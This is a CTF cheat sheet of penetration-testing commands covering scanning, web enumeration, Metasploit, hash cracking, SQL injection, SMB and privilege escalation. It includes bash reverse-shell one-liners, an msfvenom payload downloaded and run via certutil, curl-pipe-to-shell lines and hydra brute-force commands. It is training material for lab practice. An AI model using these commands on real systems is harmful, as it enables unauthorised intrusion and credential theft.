# CTF Cheat Sheet

## Network Utilities

### Nmap

```txt
nmap -sC -sV <machines ip>

-sV	Attempts to determine the version of the services running

-p <x> or -p-	Port scan for port <x> or scan all ports

-Pn	Disable host discovery and just scan for open ports

-A 	Enables OS and version detection, executes in-build scripts for further enumeration

-O	Enable OS detection

-sC	Scan with the default nmap scripts

-v 	Verbose mode (-vv for greater effect)

-sU 	UDP port scan

-sS 	TCP SYN port scan

-sn ping scan (test if the host(s) is up)

-n 	never do dns resolver

-T<0-5> 	Set timing template (highest is faster)

-oA <basename>	Output in the three major formats at once

-script vuln	search for vulnerablities
```

### Netcut

Start web server :

```python
python3 -m http.server 80
```

Create a netcat listener (reading from and writing to network connections using TCP or UDP)

```txt
nc -nvlp port  

-n : Do not do any DNS or service lookups on any specified addresses, hostnames or ports.

-v : Have nc give more verbose output.

-l : Used to specify that nc should listen for an incoming connection rather than initiate a connection to a remote host.

-s  *source_ip_address :*  Specifies the IP of the interface which is used to send the packets.

-p source_port : Specifies the source port nc should use.

-e specify which program to execute after connecting to a host

-u connect to udp ports
```

## Web Enumeration

### Gobuster

```txt
gobuster dir -u http://<ip>:<port> -w <wordlist path> -t 30

-u  The target URL
-e	Print the full URLs in your console
-w	Path to your wordlist Kali "/usr/share/wordlistsdirb/common.txt"
-x	Set extension
-p <x>	Proxy to use for requests
-c <http cookies>	Specify a cookie for simulating your auth
-t	Number of concurrent threads
-U and -P	Username and Password for Basic Auth
-s <status>	status code interpreted as valid
-k	skip ssl certificate verification
-a	specify User-Agent
-h	specify HTTP header
```

### Nikto

Scan web server for known vulnerabilities

```txt
nikto

-h		specify host
-nossl	disable ssl
-ssl	force ssl
-id		specify authentication (username + pass)
-plugins	select plugin to use
--list-plugings list all possible plugins to use
-update	update pluging list
```

## Metasploit

### Core

```txt
msfconsole	start metasploit
search		search modules
use			select module
info			display info about specific module
```

### Module

```txt
options		list options to set
advanced    view advanced option for a specific module
show		show option in a specific category
set			set option
payload		set payload
exploit		run the exploit
-j			run the exploit in the background
session		list all current sessions
-i			go into interactive mode with a session
```

### Post

```txt
download	download file from the machine
upload		upload file to the machine
ps			list all running processes
migrate		change processes on the victime host
ls			list files in the current directory
execute		execute a command on the remote host
shell		starts a interactive shell on the remote host
search		find files on the target host (similar to linux "find")
cat			output file on the remote host
background	put a meterpreter shell into background mode
```

## Hash Cracking

### Hashcat

```txt
hashcat -m <type> <hash> <wordlist>

-m --hash-type    (exemple md5 -m 0)
-a --attack-mode  (exemple burteforce -a 3)
```

[Hashcat types](https://hashcat.net/wiki/doku.php?id=example_hashes)

### JohnTheRipper

```txt
john <hash> --wordlist=<path>

--wordlis	specify wordlist to use
--format	specify format 
--rules	    specify rules
--show	    show password
```

Decrypt ssh passphase

```txt
ssh2john.py key.txt
```

### Hydra

Hydra Commands

The options we pass into Hydra depends on which service (protocol) we're attacking. For example if we wanted to bruteforce FTP with the username being user and a password list being passlist.txt, we'd use the following command:

`hydra -l user -P passlist.txt ftp://10.10.64.167`

For the purpose of this deployed machine, here are the commands to use Hydra on SSH and a web form (POST method).

SSH

`hydra -l <username> -P <full path to pass> 10.10.64.167 -t 4 ssh`

![https://i.imgur.com/D71vkKM.png](https://i.imgur.com/D71vkKM.png)

We can use Hydra to bruteforce web forms too, you will have to make sure you know which type of request its making - a GET or POST methods are normally used. You can use your browsers network tab (in developer tools) to see the request types, of simply view the source code.

Below is an example Hydra command to brute force a POST login form:

`hydra -l <username> -P <wordlist> 10.10.64.167 http-post-form "/:username=^USER^&password=^PASS^:F=incorrect" -V`

![https://i.imgur.com/vC3ZU4E.png](https://i.imgur.com/vC3ZU4E.png)

## SQL injection

### Sqlmap

```txt
sqlmap -u <url>

-u <url>	specify target url (with protocol)
-g		use google dorking
-p <parm>	spceifiy which parameter to use (include parms in the url)
-dbms		set database
--dump	dump dbms entry
--dump-all dumb all dbms
-D DB		DBMS database to enumerate
-T TBL	DBMS database table to enumerate 
-C COL	DBMS database table comun to enumerate
--level	set level of test to perform (1-5)
--risk		set risk of test to perfomor (1-3)
```

[OWASP SQLi](https://owasp.org/www-community/attacks/SQL_Injection)

## Samba

### Smbmap

```txt
smbmap -u <user> -p <pass> -H 10.10.10.10 -x ipconfig

-u <user>	set the username
-p <pass>	set the password
-H <host>	set the host
-x <cmd>	run command on the server
-s <dir>	specify the share to enumerate
-d <dmn>	specify the domain to enumerate
--download	download a file
--upload	upload a file
```

### Smbclient

```txt
smbclient <host>

-L list available services on the server
-W	specify workgroup
-I	specify host's ip adresse
-c cmd	run command on the target machine
-U user	specify the username to authenticate with
-P pass	specify the password to authenticate with
-N	not use a password
get file	download file
mget mask	downlaod files matching the mask
put file	upload file
mput mask upload all files matching the mask to current working directory
```

Due to shell restrictions, you will need to escape the backslashes for the host.

## Reverse shell

### Linux

```bash
bash -i >& /dev/tcp/ip_addr/port 0>&1

-i interactive shell
```

```bash
bash -i >& /dev/tcp/10.9.173.10/1338 0>&1
```

```txt
>& file ~ >file 2>&1

&x : indicate that x is a file discriptors
0 : stdin
1 : stdout
2 : stderr
```

### Windows

php

```bash
msfvenom -p windows/meterpreter/reverse_tcp lhost=<ip> lport=<port> -f exe > shell.exe
shell_exec("cmd.exe /C certutil.exe -urlcache -split -f http://<ip>/shell.exe shell.exe & shell.exe
```
Note :

```bash
certutil.exe -urlcache -split -f <url of file> <location to save file> 
```


## Privilege Escalation

### Linpeas

```txt
linpeas.sh

- -a (all checks) - This will execute also the check of processes during 1 min, will search more possible hashes inside files, and brute-force each user using su with the top2000 passwords.
- -s (superfast & stealth) - This will bypass some time consuming checks - Stealth mode (Nothing will be written to disk)
- -P (Password) - Pass a password that will be used with sudo -l and bruteforcing other users
```

#### Local network

```txt
sudo python -m SimpleHTTPServer 8080
curl 10.10.10.10/linpeas.sh -output linpeas.sh
curl 10.10.10.10/linpeas.sh | sh
```

#### Without curl

```txt
sudo nc -q 5 -lvnp 80 < linpeas.sh
cat < /dev/tcp/10.10.10.10/80 | sh
```

#### Output to file

```txt
linpeas -a > /dev/shm/linpeas.txt
less -r /dev/shm/linpeas.txt #Read with colors
```

### Lxd Privilege Escalation

[exploit-db](https://www.exploit-db.com/exploits/46978)

### Sudo permissions

```bash
sudo -l
```

### SUID Binaries Privilege Escalate

```txt
 find / -perm -u=s -type f 2>/dev/null

-perm	denotes search for the permissions that follow
-u=s  	denotes look for files that are owned by the root user
-type	states the type of file we are looking for
-f		denotes a regular file, not the directories or special files
```

Capability

```bash
getcap -r / 2>/dev/null
```

Spawn bash

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

## Google Dorking

|Term|Action|
|----|------|
|site|Finds pages only within a particular domain and all its subdomains|
|related|Finds web pages that are similar to the specified web page|
|info|Presents some information that Google has about a web page, including similar pages|
|filetype|Search for a file by its extension (e.g. PDF)|
|cache|View Google's Cached version of a specified URL|
|intitle|The specified phrase MUST appear in the title of the page|
|inurl|Finds pages that include a specific keyword as part of their indexed URLs|
|intext|Searches text of page|
|language|Returns websites that match the search term in a specified language|

## Useful links

### General

[https://github.com/swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) (A bunch of tools and payloads for every stage of pentesting)


### Linux

[https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum) (One of the most popular priv esc scripts)

[https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh](https://github.com/diego-treitos/linux-smart-enumeration/blob/master/lse.sh) (Another popular script)

[https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester) (A Script that's dedicated to searching for kernel exploits)

[https://gtfobins.github.io](https://gtfobins.github.io) (I can not overstate the usefulness of this for priv esc, if a common binary has special permissions, you can use this site to see how to get root perms with it.)

### Windows

[https://www.fuzzysecurity.com/tutorials/16.html](https://www.fuzzysecurity.com/tutorials/16.html)  (Dictates some very useful commands and methods to enumerate the host and gain intel)

[https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp](https://github.com/PowerShellEmpire/PowerTools/tree/master/PowerUp) (A bit old but still an incredibly useful script)
